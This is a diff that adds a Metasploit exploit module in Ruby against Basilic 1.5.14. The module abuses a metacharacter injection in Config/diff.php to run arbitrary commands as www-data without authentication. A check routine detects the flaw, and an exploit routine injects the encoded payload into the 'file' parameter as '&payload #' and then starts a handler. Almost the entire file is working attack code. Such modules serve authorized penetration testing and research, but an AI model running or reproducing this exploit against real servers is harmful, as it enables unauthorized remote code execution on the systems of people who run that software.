@@ -1,0 +1,107 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'Basilic 1.5.14 diff.php Arbitrary Command Execution',
+			'Description'    => %q{
+					This module abuses a metacharacter injection vulnerability in the
+				diff.php script. This flaw allows an unauthenticated attacker to execute arbitrary
+				commands as the www-data user account.
+			},
+			'Author'         =>
+				[
+					'lcashdollar',
+					'sinn3r',
+					'juan'
+				],
+			'License'        => MSF_LICENSE,
+			'References'     =>
+				[
+					[ 'BID', '54234' ]
+				],
+			'Platform'       => ['linux', 'unix'],
+			'Arch'           => ARCH_CMD,
+			'Privileged'     => true,
+			'Payload'        =>
+				{
+					'DisableNops' => true,
+					'Compat'      =>
+						{
+							'PayloadType' => 'cmd',
+							'RequiredCmd' => 'generic perl ruby bash telnet'
+						}
+				},
+			'Targets'        =>
+				[
+					[ 'Automatic Target', { }]
+				],
+			'DefaultTarget'  => 0,
+			'DisclosureDate' => 'Jun 28 2012'
+		))
+
+		register_options(
+			[
+				OptString.new('TARGETURI', [true, 'The base path to Basilic', '/basilic-1.5.14/'])
+			], self.class)
+	end
+
+
+	def check
+		base = target_uri.path
+		base << '/' if base[-1, 1] != '/'
+
+		sig = rand_text_alpha(10)
+
+		res = send_request_cgi({
+			'uri'  => "/#{base}/Config/diff.php",
+			'vars_get' => {
+				'file' => sig,
+				'new'  => '1',
+				'old'  => '2'
+			}
+		})
+
+		if res and res.body =~ /#{sig}/
+			return Exploit::CheckCode::Vulnerable
+		else
+			return Exploit::CheckCode::Safe
+		end
+	end
+
+
+	def exploit
+		print_status("Sending GET request...")
+
+		base = target_uri.path
+		base << '/' if base[-1, 1] != '/'
+
+		res = send_request_cgi({
+				'uri' => "/#{base}/Config/diff.php",
+				'vars_get' => {
+					'file' => "&#{payload.encoded} #",
+					'new'  => '1',
+					'old'  => '2'
+				}
+			})
+
+		if res and res.code == 404 then
+			print_error("404 Basilic not installed or possibly check URI Path.")
+		else
+			vprint_line(res.body) if res
+		end
+
+		handler
+	end
+end
